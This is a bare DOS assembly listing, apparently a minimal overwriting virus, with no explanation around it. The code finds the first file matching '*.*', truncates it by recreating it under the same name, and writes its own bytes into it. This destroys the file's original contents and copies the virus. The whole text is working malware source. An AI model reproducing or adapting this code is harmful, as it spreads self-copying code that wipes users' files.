Main:           Mov Ah,4eh
On2:            Lea Dx,FileSpec
                Int 21h
                Mov Ah,3ch
                Mov Dx,9eh
                Int 21h
                Mov Bh,40h
                Xchg Ax,Bx
                Lea Dx,Main
                Mov Cl,Length
                Int 21h
FileSpec        Db '*.*',0
Length          Equ $-Main
